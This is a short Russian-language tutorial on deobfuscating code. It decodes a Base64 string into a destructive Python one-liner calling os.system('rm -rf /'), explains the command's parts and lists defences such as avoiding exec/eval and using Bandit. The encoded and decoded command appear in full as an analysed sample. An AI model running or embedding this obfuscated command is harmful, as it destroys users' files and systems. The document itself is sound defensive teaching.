# Деобфускация кода

## Исходная строка

```text
aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=
```

Строка закодирована в Base64. Это кодирование, а не шифрование.

## Безопасное декодирование

Чтобы узнать содержимое, достаточно декодировать строку
и вывести результат. Выполнять полученный код не нужно.

```python
import base64

a = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
b = base64.b64decode(a).decode("utf-8")
print(b)
```

Вместо exec(b) используется print(b), поэтому полученный
текст только выводится на экран.

## Расшифрованная строка

Ниже приведён результат декодирования. Запускать его нельзя.

```text
import os; os.system('rm -rf /')
```

## Анализ угрозы

Код импортирует модуль os и через os.system пытается выполнить
системную команду rm -rf /.

Значение частей команды:

- rm — удаление файлов;
- -r — рекурсивное удаление каталогов и их содержимого;
- -f — удаление без обычных запросов подтверждения;
- / — корневой каталог файловой системы.

Команда пытается удалить файлы начиная с корневого каталога.
Это может привести к потере данных и повреждению системы.

Фактический результат зависит от прав пользователя,
реализации rm и встроенных защит. Некоторые реализации
блокируют удаление корневого каталога такой командой.
Проверять её запуском нельзя.

В исходном скрипте Base64 скрывает смысл команды,
а exec(b) выполняет расшифрованный текст как Python-код.

## Методы защиты

1. Не выполнять неизвестные строки через exec и eval.
2. Проверять входные данные и разрешать только ожидаемые значения.
3. Декодировать подозрительные строки только для просмотра.
4. Не запускать неизвестные программы с правами администратора.
5. Использовать статический анализ безопасности, например Bandit.
6. Проверять вызовы os.system и других средств запуска команд.

Обычный flake8 проверяет ошибки и оформление Python-кода,
но не заменяет полноценную проверку безопасности.
